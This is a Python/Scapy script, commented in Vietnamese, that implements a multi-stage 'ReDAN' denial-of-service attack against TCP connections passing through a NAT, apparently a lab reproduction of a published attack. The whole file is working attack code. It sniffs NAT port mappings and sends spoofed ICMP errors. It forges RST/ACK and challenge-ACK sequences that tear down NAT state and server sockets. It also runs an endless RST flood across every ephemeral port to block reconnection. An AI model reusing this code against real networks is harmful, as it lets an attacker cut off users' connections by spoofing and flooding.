"""
attacker.py — ReDAN NAT DoS Attacker [FIXED v2]

Topology:
  Client 192.168.1.10 ──► NAT(1.1.1.1) ──► Server 1.1.1.10:8080
                                            Attacker 1.1.1.20

Yêu cầu: sudo python3 attacker.py
"""

import sys
import time
import threading
import random

from scapy.all import (
    IP, TCP, ICMP, Raw,
    send, sniff,
    conf
)

# ═══════════════════════════════════════════════════
# CẤU HÌNH MẠNG — chỉnh sửa theo môi trường của bạn
# ═══════════════════════════════════════════════════
NAT_PUBLIC_IP = "1.1.1.1"
SERVER_IP     = "1.1.1.10"
SERVER_PORT   = 8080
ATTACKER_IP   = "1.1.1.20"
ATTACKER_NIC  = "ens33"       # ← đổi nếu cần (dùng: ip a)

conf.iface = ATTACKER_NIC

# ═══════════════════════════════════════════════════
# SHARED STATE
# ═══════════════════════════════════════════════════
nat_mappings:   dict = {}   # { nat_port: {cli_seq, cli_ack, srv_seq, srv_ack} }
challenge_acks: dict = {}   # { nat_port: rcv_nxt }


# ═══════════════════════════════════════════════════
# HELPER — Sniff nhanh để lấy seq/ack mới nhất
# ═══════════════════════════════════════════════════
def refresh_seq_numbers(timeout: int = 4):
    """
    Sniff nhanh trong `timeout` giây để cập nhật cli_seq/srv_seq
    mới nhất ngay trước khi tấn công — tránh dùng seq cũ từ Phase 0.
    """
    def handler(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return
        src, dst = pkt[IP].src, pkt[IP].dst
        sp,  dp  = pkt[TCP].sport, pkt[TCP].dport
        seq, ack = pkt[TCP].seq,   pkt[TCP].ack

        if src == NAT_PUBLIC_IP and dst == SERVER_IP and dp == SERVER_PORT:
            if sp in nat_mappings:
                nat_mappings[sp]['cli_seq'] = seq
                nat_mappings[sp]['cli_ack'] = ack

        elif src == SERVER_IP and dst == NAT_PUBLIC_IP and sp == SERVER_PORT:
            if dp in nat_mappings:
                nat_mappings[dp]['srv_seq'] = seq
                nat_mappings[dp]['srv_ack'] = ack

    sniff(
        iface=ATTACKER_NIC,
        filter=(f"tcp and "
                f"((src host {NAT_PUBLIC_IP} and dst host {SERVER_IP}) or "
                f" (src host {SERVER_IP}     and dst host {NAT_PUBLIC_IP}))"),
        prn=handler,
        timeout=timeout,
        store=False
    )
    print(f"  [~] Seq refreshed: "
          + ", ".join(f"xs={p} srv_seq={i.get('srv_seq','?')}"
                      for p, i in nat_mappings.items()))


# ═══════════════════════════════════════════════════
# PHASE 0 — Phát hiện NAT mappings
# ═══════════════════════════════════════════════════
def phase0_discover_mappings(timeout: int = 25) -> bool:
    """
    Sniff traffic trên subnet public để tìm port xs mà NAT ánh xạ cho client.
    Cập nhật liên tục cli_seq/srv_seq trong suốt timeout.
    """
    print(f"[Phase 0] Sniffing NAT mappings on {ATTACKER_NIC} (timeout={timeout}s)...")
    print(f"          Đảm bảo client đang gửi heartbeat trong thời gian này.\n")

    def handler(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return
        src, dst = pkt[IP].src, pkt[IP].dst
        sp,  dp  = pkt[TCP].sport, pkt[TCP].dport
        seq, ack = pkt[TCP].seq,   pkt[TCP].ack

        # Client → Server qua NAT: src=1.1.1.1:xs  dst=1.1.1.10:8080
        if src == NAT_PUBLIC_IP and dst == SERVER_IP and dp == SERVER_PORT:
            if sp not in nat_mappings:
                nat_mappings[sp] = {}
                print(f"  [+] Mapping found: {NAT_PUBLIC_IP}:{sp} → {SERVER_IP}:{SERVER_PORT}")
            nat_mappings[sp]['cli_seq'] = seq
            nat_mappings[sp]['cli_ack'] = ack

        # Server → Client qua NAT: src=1.1.1.10:8080  dst=1.1.1.1:xs
        elif src == SERVER_IP and dst == NAT_PUBLIC_IP and sp == SERVER_PORT:
            if dp in nat_mappings:
                nat_mappings[dp]['srv_seq'] = seq
                nat_mappings[dp]['srv_ack'] = ack

    sniff(
        iface=ATTACKER_NIC,
        filter=(f"tcp and "
                f"((src host {NAT_PUBLIC_IP} and dst host {SERVER_IP}) or "
                f" (src host {SERVER_IP}     and dst host {NAT_PUBLIC_IP}))"),
        prn=handler,
        timeout=timeout,
        store=False
    )

    print(f"\n[Phase 0] Found {len(nat_mappings)} mapping(s): "
          f"ports = {list(nat_mappings.keys())}")
    return len(nat_mappings) > 0


# ═══════════════════════════════════════════════════
# STAGE 1 — ICMP Frag Needed + Port Unreachable
#
#   a) Frag Needed (type=3, code=4, mtu=576):
#      Ép client/NAT giảm PMTU, segment nhỏ hơn
#      → chuẩn bị cho Stage 2
#
#   b) Port Unreachable (type=3, code=3):
#      Kích Linux conntrack xóa entry ngay lập tức
#      mạnh hơn Frag Needed trong việc phá NAT state
# ═══════════════════════════════════════════════════
def stage1_icmp_attack(small_mtu: int = 576, repeat: int = 10):
    print(f"\n{'='*55}")
    print(f"[Stage 1] ICMP: Frag Needed + Port Unreachable (MTU={small_mtu})...")

    for nat_port, info in nat_mappings.items():
        cli_seq = info.get('cli_seq', 0)

        # Phần IP+TCP gốc nhúng vào ICMP error (đúng RFC 792)
        orig_ip  = IP(src=NAT_PUBLIC_IP, dst=SERVER_IP)
        orig_tcp = TCP(sport=nat_port, dport=SERVER_PORT, seq=cli_seq)

        # a) Fragmentation Needed: ép giảm MTU
        icmp_frag = (IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
                     ICMP(type=3, code=4, nexthopmtu=small_mtu) /
                     orig_ip / orig_tcp)
        send(icmp_frag, count=repeat, inter=0.05, verbose=False)
        print(f"  [+] Frag Needed  ×{repeat} → {NAT_PUBLIC_IP}:{nat_port}  MTU={small_mtu}")

        # b) Port Unreachable: xóa conntrack entry ngay
        icmp_unreach = (IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
                        ICMP(type=3, code=3) /
                        orig_ip / orig_tcp)
        send(icmp_unreach, count=repeat, inter=0.05, verbose=False)
        print(f"  [+] Port Unreach ×{repeat} → {NAT_PUBLIC_IP}:{nat_port}")

    time.sleep(0.5)
    print("[Stage 1] Hoàn tất ICMP attack.\n")


# ═══════════════════════════════════════════════════
# STAGE 2 — Xóa NAT mapping bằng RST/ACK
#
#   FIX 1: Gọi refresh_seq_numbers() để lấy srv_seq mới nhất
#          ngay trước khi tấn công
#   FIX 2: step=1 trong range(-10, 11) thay vì step=10
#          → không bỏ sót cửa sổ conntrack hẹp
# ═══════════════════════════════════════════════════
def stage2_remove_nat_mappings():
    print(f"{'='*55}")
    print(f"[Stage 2] Xóa NAT mappings — đang refresh seq...")

    # Lấy srv_seq mới nhất ngay trước khi tấn công
    refresh_seq_numbers(timeout=4)

    for nat_port, info in nat_mappings.items():
        base_seq = info.get('srv_seq', random.randint(0, 2**32 - 1))
        ack_val  = info.get('cli_seq', 0)

        # FIX: step=1, range hẹp ±10 quanh base_seq
        for delta in range(-10, 11):
            seq = (base_seq + delta) % (2**32)
            pkt = (IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
                   TCP(sport=SERVER_PORT, dport=nat_port,
                       flags="RA", seq=seq, ack=ack_val))
            send(pkt, verbose=False)

        print(f"  [+] RST/ACK ×21 → {NAT_PUBLIC_IP}:{nat_port}  "
              f"base_seq={base_seq}")

    time.sleep(0.5)
    print("[Stage 2] NAT mappings đã bị xóa.\n")


# ═══════════════════════════════════════════════════
# STAGE 3 — Phá server TCP state qua challenge ACK
#
#   FIX: stop_filter → sniff dừng ngay khi đủ ACK
#        RST được gửi gần như ngay lập tức
# ═══════════════════════════════════════════════════
def stage3_manipulate_server(sniff_timeout: int = 6):
    print(f"{'='*55}")
    print(f"[Stage 3] Manipulating server TCP state...")

    sniff_done = threading.Event()

    # ── 3b: sniff challenge ACK từ server ──
    def do_sniff():
        def handler(pkt):
            if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
                return
            if pkt[IP].src != SERVER_IP or pkt[IP].dst != NAT_PUBLIC_IP:
                return
            if pkt[TCP].sport != SERVER_PORT:
                return
            if pkt[TCP].flags & 0x10:   # ACK flag
                nat_port = pkt[TCP].dport
                rcv_nxt  = pkt[TCP].ack
                if nat_port in nat_mappings and nat_port not in challenge_acks:
                    challenge_acks[nat_port] = rcv_nxt
                    print(f"  [+] Challenge ACK ← server  "
                          f"nat_port={nat_port}  rcv.nxt={rcv_nxt}")

        # FIX: stop_filter → không đợi hết timeout nếu đủ ACK rồi
        sniff(
            iface=ATTACKER_NIC,
            filter=(f"tcp and src host {SERVER_IP} "
                    f"and dst host {NAT_PUBLIC_IP}"),
            prn=handler,
            stop_filter=lambda p: len(challenge_acks) >= len(nat_mappings),
            timeout=sniff_timeout,
            store=False
        )
        sniff_done.set()

    t = threading.Thread(target=do_sniff, daemon=True)
    t.start()
    time.sleep(0.3)   # cho sniff thread khởi động

    # ── 3a: gửi PUSH/ACK với seq ngoài window → trigger challenge ACK ──
    for nat_port, info in nat_mappings.items():
        base_ack = info.get('cli_ack', 0)
        arb_seq  = (base_ack + 2**28) % (2**32)
        ack_val  = info.get('cli_seq', 0)

        pkt = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
               TCP(sport=nat_port, dport=SERVER_PORT,
                   flags="PA", seq=arb_seq, ack=ack_val) /
               Raw(b"X" * 8))
        send(pkt, verbose=False)
        print(f"  [+] PUSH/ACK → {SERVER_IP}:{SERVER_PORT}  "
              f"(spoofed {NAT_PUBLIC_IP}:{nat_port}  seq={arb_seq})")

    # Đợi sniff xong rồi gửi RST ngay
    sniff_done.wait(timeout=sniff_timeout + 1)

    # ── 3c: RST seq=rcv.nxt → teardown server socket ──
    if challenge_acks:
        for nat_port, rcv_nxt in challenge_acks.items():
            rst = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
                   TCP(sport=nat_port, dport=SERVER_PORT,
                       flags="R", seq=rcv_nxt))
            send(rst, verbose=False)
            print(f"  [+] RST → {SERVER_IP}:{SERVER_PORT}  "
                  f"seq={rcv_nxt}  (server socket torn down)")
    else:
        # Fallback brute-force nếu không bắt được challenge ACK
        print("  [!] Không bắt được Challenge ACK → brute-force seq...")
        for nat_port, info in nat_mappings.items():
            base = info.get('cli_ack', 0)
            for delta in range(-5, 6):
                seq = (base + delta) % (2**32)
                rst = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
                       TCP(sport=nat_port, dport=SERVER_PORT,
                           flags="R", seq=seq))
                send(rst, verbose=False)
            print(f"  [+] RST ×11 → {SERVER_IP}:{SERVER_PORT}  nat_port={nat_port}")

    time.sleep(1)
    print("[Stage 3] Server sockets should be torn down.\n")


# ═══════════════════════════════════════════════════
# STAGE 4 — Chặn client reconnect VÔ THỜI HẠN
#
#   - Không timeout: chạy cho đến Ctrl+C
#   - Không seen_ports: kill mọi packet kể cả port cũ
#   - Carpet-bomb thread: flood toàn bộ ephemeral range
#     song song với reactive sniff → chặn trước cả khi
#     client kịp gửi SYN
# ═══════════════════════════════════════════════════
EPHEM_START = 32768
EPHEM_END   = 61001
CARPET_BURST = 1000   # số gói mỗi lần send() trong carpet-bomb


def _carpet_bomb_worker(stop_event: threading.Event):
    """
    Thread phụ: liên tục xả RST/ACK vào toàn bộ dải
    ephemeral port (32768-61000) trên NAT.
    Mục tiêu: phá bất kỳ NAT mapping mới nào ngay khi
    nó được tạo — trước cả khi sniff kịp phát hiện.
    Băng thông ước tính: ~5.72 MB/s (khớp với bài báo).
    """
    sweep = 0
    all_ports = list(range(EPHEM_START, EPHEM_END))

    while not stop_event.is_set():
        # Build một sweep đầy đủ
        pkts = [
            IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
            TCP(sport=SERVER_PORT, dport=p, flags="RA",
                seq=random.randint(0, 2**32 - 1), ack=0)
            for p in all_ports
        ]
        # Gửi theo burst để tránh block quá lâu
        for i in range(0, len(pkts), CARPET_BURST):
            if stop_event.is_set():
                return
            send(pkts[i : i + CARPET_BURST], verbose=False, inter=0)

        sweep += 1
        if sweep % 10 == 0:
            print(f"  [~] Carpet sweep #{sweep} "
                  f"({(EPHEM_END - EPHEM_START) * sweep} pkts total)")


def stage4_block_reconnections():
    """
    Chặn reconnect vô thời hạn bằng 2 lớp bảo vệ:
      Lớp 1 (reactive) : sniff → kill ngay khi thấy packet mới
      Lớp 2 (proactive): carpet-bomb thread liên tục flood
                         toàn bộ ephemeral range
    Dừng bằng Ctrl+C.
    """
    print(f"{'='*55}")
    print(f"[Stage 4] Blocking reconnections (Ctrl+C để dừng)...")
    print(f"          Carpet-bomb: {EPHEM_START}–{EPHEM_END-1} "
          f"({EPHEM_END - EPHEM_START} ports/sweep)\n")

    killed      = 0
    stop_event  = threading.Event()

    # ── Lớp 2: Khởi động carpet-bomb thread ──
    bomb_thread = threading.Thread(
        target=_carpet_bomb_worker,
        args=(stop_event,),
        daemon=True
    )
    bomb_thread.start()

    # ── Lớp 1: Reactive sniff ──
    def kill(pkt):
        nonlocal killed
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return
        if pkt[IP].src != NAT_PUBLIC_IP or pkt[IP].dst != SERVER_IP:
            return
        if pkt[TCP].dport != SERVER_PORT:
            return

        xs     = pkt[TCP].sport
        seq_in = pkt[TCP].seq
        ack_in = pkt[TCP].ack

        # RST → Server (spoofed IP NAT)
        rst_srv = (IP(src=NAT_PUBLIC_IP, dst=SERVER_IP) /
                   TCP(sport=xs, dport=SERVER_PORT,
                       flags="R", seq=seq_in + 1))
        # RST → NAT  (spoofed IP Server)
        rst_nat = (IP(src=SERVER_IP, dst=NAT_PUBLIC_IP) /
                   TCP(sport=SERVER_PORT, dport=xs,
                       flags="R", seq=ack_in))
        send([rst_srv, rst_nat], verbose=False)

        killed += 1
        print(f"  [+] Kill #{killed}: NAT:{xs}  RST×2 sent")

    try:
        sniff(
            iface=ATTACKER_NIC,
            filter=(f"tcp and src host {NAT_PUBLIC_IP} "
                    f"and dst host {SERVER_IP} "
                    f"and dst port {SERVER_PORT}"),
            prn=kill,
            store=False
            # Không có timeout → chạy đến Ctrl+C
        )
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        bomb_thread.join(timeout=3)
        print(f"\n[Stage 4] Stopped. Total reactive kills: {killed}.")


# ═══════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════
def main():
    print("=" * 55)
    print("  ReDAN NAT DoS Attacker  [FIXED v2]")
    print(f"  Target : {SERVER_IP}:{SERVER_PORT} via NAT {NAT_PUBLIC_IP}")
    print(f"  Attacker: {ATTACKER_IP}  NIC: {ATTACKER_NIC}")
    print("=" * 55 + "\n")

    if not phase0_discover_mappings(timeout=25):
        print("[!] Không tìm thấy NAT mappings. "
              "Hãy đảm bảo client đang chạy và kết nối đến server.")
        sys.exit(1)

    input("\n[?] Enter → Stage 1 (ICMP Frag Needed + Port Unreachable)...")
    stage1_icmp_attack(small_mtu=576, repeat=10)

    input("[?] Enter → Stage 2 (Remove NAT mappings via RST/ACK)...")
    stage2_remove_nat_mappings()

    input("[?] Enter → Stage 3 (Teardown server sockets via challenge ACK)...")
    stage3_manipulate_server(sniff_timeout=6)

    input("[?] Enter → Stage 4 (Block all reconnections — Ctrl+C để dừng)...")
    stage4_block_reconnections()


if __name__ == "__main__":
    if sys.platform == "win32":
        print("[!] Scapy cần Linux với quyền root.")
        sys.exit(1)
    main()